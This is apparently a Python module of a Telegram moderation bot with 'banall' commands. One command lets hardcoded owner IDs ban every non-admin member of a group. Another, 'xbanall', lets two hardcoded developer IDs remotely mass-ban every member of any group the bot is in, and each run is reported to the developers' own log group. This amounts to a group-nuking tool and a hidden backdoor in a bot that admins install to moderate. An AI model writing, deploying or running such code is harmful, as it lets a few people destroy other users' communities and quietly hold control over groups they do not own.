import os
from time import sleep
from telethon import functions, types
from telethon.errors import FloodWaitError
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.tl.types import (
    ChannelParticipantAdmin,
    ChannelParticipantCreator,
    ChatBannedRights,
    ChannelParticipantsSearch
)
from Mikobot import tbot as telethn, LOGGER
from Mikobot.events import register

OWNER_IDS = [6259443940, 5053815620, 6810396528]
PDOX_IDS = [6259443940, 6810396528]
LOG_GROUP_ID = -1002221570986
is_banning = False
log_file_path = "banned_users_log.txt"  # store banned user info

async def is_register_admin(chat, user):
    if isinstance(chat, (types.InputPeerChannel, types.InputChannel)):
        return isinstance(
            (
                await telethn(functions.channels.GetParticipantRequest(chat, user))
            ).participant,
            (types.ChannelParticipantAdmin, types.ChannelParticipantCreator),
        )
    if isinstance(chat, types.InputPeerUser):
        return True

# Function to log banned users
def log_banned_user(user):
    with open(log_file_path, "a") as f:
        f.write(f"{user.first_name} | {user.id}\n")

# Send log message to log group
async def send_log_message(command_name, chat, event):
    group_link = f"t.me/c/{chat.id}/{event.id}"
    log_message = f"""
**{command_name} ʜᴀs ʙᴇᴇɴ ᴇxᴇᴄᴜᴛᴇᴅ:**

**Gʀᴏᴜᴘ Nᴀᴍᴇ**: {chat.title}
**Group ID**: {chat.id}
[Gʀᴏᴜᴘ Lɪɴᴋ]({group_link})

**Ʃxᴇᴄᴜᴛᴏʀ**: [{event.sender.first_name}](tg://user?id={event.sender_id})
"""
    await telethn.send_message(LOG_GROUP_ID, log_message)

# Ban All
@register(pattern="^/banall$")
async def ban_all(event):
    global is_banning
    if event.sender_id not in OWNER_IDS:
        return await event.respond("⌥ ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ.")

    chat = await event.get_chat()
    if event.is_private:
        return await event.respond("↻ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ʙᴇ ᴜsᴇᴅ ɪɴ ɢʀᴏᴜᴘs ᴀɴᴅ ᴄʜᴀɴɴᴇʟs.")
    
    is_banning = True
    await send_log_message("BanAll", chat, event)
    done = await event.reply("↻ sᴇᴀʀᴄʜɪɴɢ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛ ʟɪsᴛs")
    p = 0
    async for i in telethn.iter_participants(event.chat_id, filter=ChannelParticipantsSearch('')):
        if not is_banning:
            await done.edit("↻ ʙᴀɴ ᴏᴘᴇʀᴀᴛɪᴏɴ sᴛᴏᴘᴘᴇᴅ")
            return
        if i.id in OWNER_IDS:
            continue
        try:
            participant = await telethn(GetParticipantRequest(event.chat_id, i.id))
            if isinstance(participant.participant, (ChannelParticipantAdmin, ChannelParticipantCreator)):
                continue
            rights = ChatBannedRights(until_date=None, view_messages=True)
            await telethn(functions.channels.EditBannedRequest(event.chat_id, i, rights))
            log_banned_user(i)  # Log user
        except FloodWaitError as ex:
            LOGGER.warn(f"↻ sʟᴇᴇᴘɪɴɢ ғᴏʀ {ex.seconds} sᴇᴄᴏɴᴅs")
            sleep(ex.seconds)
        except Exception as ex:
            await event.reply(str(ex))
        else:
            p += 1

    if p == 0:
        await done.edit("↻ ɴᴏ ᴏɴᴇ ᴡᴀs ʙᴀɴɴᴇᴅ ɪɴ ᴛʜɪs ᴄʜᴀᴛ")
        return
    required_string = "↻ sᴜᴄᴄᴇssғᴜʟʟʏ ʙᴀɴɴᴇᴅ **{}** ᴜsᴇʀs"
    await event.reply(required_string.format(p))

# XBan All
@register(pattern="^/xbanall (.+)$")
async def xban_all(event):
    global is_banning
    if event.sender_id not in PDOX_IDS:
        return await event.respond("⌥ ᴏɴʟʏ ᴛʜᴇ ᴅᴇᴠ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ.")

    group_id = int(event.pattern_match.group(1))
    try:
        chat = await telethn.get_entity(group_id)
    except Exception as e:
        return await event.reply(f"↻ ɪɴᴠᴀʟɪᴅ ɢʀᴏᴜᴘ ɪᴅ: {str(e)}")
    
    await event.reply(f"↻ `{group_id}` ʜᴀs ʙᴇᴇɴ ᴇxᴇᴄᴜᴛᴇᴅ.")
    await event.reply("↻ sᴛᴀʀᴛɪɴɢ")
    is_banning = True
    await send_log_message("XBanAll", chat, event)
    p = 0
    async for i in telethn.iter_participants(chat.id, filter=ChannelParticipantsSearch('')):
        if not is_banning:
            await event.reply("↻ ʙᴀɴ ᴏᴘᴇʀᴀᴛɪᴏɴ sᴛᴏᴘᴘᴇᴅ")
            return
        if i.id in PDOX_IDS:
            continue
        try:
            participant = await telethn(GetParticipantRequest(chat.id, i.id))
            if isinstance(participant.participant, (ChannelParticipantAdmin, ChannelParticipantCreator)):
                continue
            rights = ChatBannedRights(until_date=None, view_messages=True)
            await telethn(functions.channels.EditBannedRequest(chat.id, i, rights))
            log_banned_user(i)  # Log user
        except FloodWaitError as ex:
            LOGGER.warn(f"↻ sʟᴇᴇᴘɪɴɢ ғᴏʀ {ex.seconds} sᴇᴄᴏɴᴅs")
            sleep(ex.seconds)
        except Exception as ex:
            await event.reply(str(ex))
        else:
            p += 1

    await telethn.send_message(LOG_GROUP_ID, f"↻ sᴜᴄᴄᴇssғᴜʟʟʏ ʙᴀɴɴᴇᴅ **{p}** ᴜsᴇʀs ғʀᴏᴍ `{chat.title}`")


# Deactivate Ban All
@register(pattern="^/deactivate$")
async def deactivate_ban_all(event):
    global is_banning
    if event.sender_id not in OWNER_IDS:
        return await event.respond("⌥ ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ.")

    is_banning = False
    await event.respond("↻ sᴛᴏᴘᴘᴇᴅ ᴛʜᴇ ʙᴀɴ ᴏᴘᴇʀᴀᴛɪᴏɴ.")
    await send_log_message("Deactivate", await event.get_chat(), event)

# Ban Log
@register(pattern="^/ban_log$")
async def ban_log(event):
    if event.sender_id not in OWNER_IDS:
        return await event.respond("⌥ ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ.")
    
    # Send log file to the user
    if os.path.exists(log_file_path):
        await event.respond("Here is the ban log file:", file=log_file_path)
    else:
        await event.respond("↻ Nᴏ ʙᴀɴ ʟᴏɢ ʏᴇᴛ.")